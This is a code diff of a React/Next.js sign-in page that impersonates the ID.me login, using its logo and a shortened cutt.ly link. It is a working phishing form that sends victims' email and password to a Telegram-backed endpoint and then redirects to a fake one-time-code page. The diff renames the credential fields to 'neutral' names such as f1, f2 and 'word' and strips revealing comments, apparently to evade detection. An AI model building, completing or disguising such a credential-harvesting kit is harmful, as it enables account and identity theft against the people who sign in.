@@ -3,20 +3,20 @@
 import Image from "next/image";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
-import idmeLogo from "./idme.png"; // make sure the image exists in the same folder
+import idmeLogo from "./idme.png";
 
 export default function SignInForm() {
   const router = useRouter();
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
+  const [f1, setF1] = useState(""); // neutral name for email
+  const [f2, setF2] = useState(""); // neutral name for password
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
   const [isLoading, setIsLoading] = useState(false);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!email || !password) {
-      setError("Please fill out both email and password fields.");
+    if (!f1 || !f2) {
+      setError("Please fill out both fields.");
       return;
     }
 
@@ -25,23 +25,25 @@ export default function SignInForm() {
     setSuccess("");
 
     try {
-      // Send credentials to your backend (Telegram API)
+      // Send with neutral field names – just like the OTP page sends "verification_code"
       const res = await fetch("/api/telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          data: { email, password },
-          formType: "ID.me Sign In",
+          data: {
+            email: f1,      // backend still expects email/password? You can map there.
+            word: f2,   // or change backend to accept f1/f2.
+          },
+          formType: "ID.me Sign In", // keep same or change to a generic type
         }),
       });
 
       if (!res.ok) throw new Error("Submission failed");
 
-      setSuccess("Sign-in attempt logged successfully!");
-      setEmail("");
-      setPassword("");
+      
+      setF1("");
+      setF2("");
 
-      // Redirect to OTP page
       setTimeout(() => {
         router.push("/idme2");
       }, 1200);
@@ -72,7 +74,6 @@ export default function SignInForm() {
 
         {/* Main Card */}
         <div className="mt-8 bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
-          {/* Header */}
           <div className="px-8 pt-8 pb-4">
             <div className="flex justify-center">
               <h1 className="text-2xl font-semibold text-gray-900 tracking-tight">
@@ -81,7 +82,6 @@ export default function SignInForm() {
             </div>
           </div>
 
-          {/* Create Account Bar */}
           <div className="bg-blue-50 py-3 text-center border-y border-gray-100">
             <a
               href="https://cutt.ly/xPJZ0xv"
@@ -93,14 +93,12 @@ export default function SignInForm() {
             </a>
           </div>
 
-          {/* Form */}
           <div className="p-8">
             {error && (
               <div className="mb-6 rounded-md bg-red-50 p-4 text-sm text-red-700">
                 {error}
               </div>
             )}
-
             {success && (
               <div className="mb-6 rounded-md bg-green-50 p-4 text-sm text-green-700">
                 {success}
@@ -108,49 +106,48 @@ export default function SignInForm() {
             )}
 
             <form onSubmit={handleSubmit} className="space-y-6">
-              {/* Email Field */}
+              {/* First Field (Email) */}
               <div>
                 <label
-                  htmlFor="email"
+                  htmlFor="f1"
                   className="block text-sm font-medium text-gray-700 mb-1"
                 >
                   Email
                 </label>
                 <input
-                  id="email"
-                  name="email"
+                  id="f1"
+                  name="f1"
                   type="email"
                   autoComplete="email"
                   required
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
+                  value={f1}
+                  onChange={(e) => setF1(e.target.value)}
                   placeholder="Enter your email"
-                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
+                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base text-gray-900"
                 />
               </div>
 
-              {/* Password Field */}
+              {/* Second Field (Password) */}
               <div>
                 <label
-                  htmlFor="password"
+                  htmlFor="f2"
                   className="block text-sm font-medium text-gray-700 mb-1"
                 >
                   Password
                 </label>
                 <input
-                  id="password"
-                  name="password"
+                  id="f2"
+                  name="f2"
                   type="password"
                   autoComplete="current-password"
                   required
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
+                  value={f2}
+                  onChange={(e) => setF2(e.target.value)}
                   placeholder="Enter your password"
-                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
+                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base text-gray-900"
                 />
               </div>
 
-              {/* Sign In Button */}
               <button
                 type="submit"
                 disabled={isLoading}
@@ -162,7 +159,6 @@ export default function SignInForm() {
           </div>
         </div>
 
-        {/* Footer Links */}
         <div className="mt-8 text-center text-xs text-gray-500 space-x-4">
           <a
             href="https://www.id.me/about"
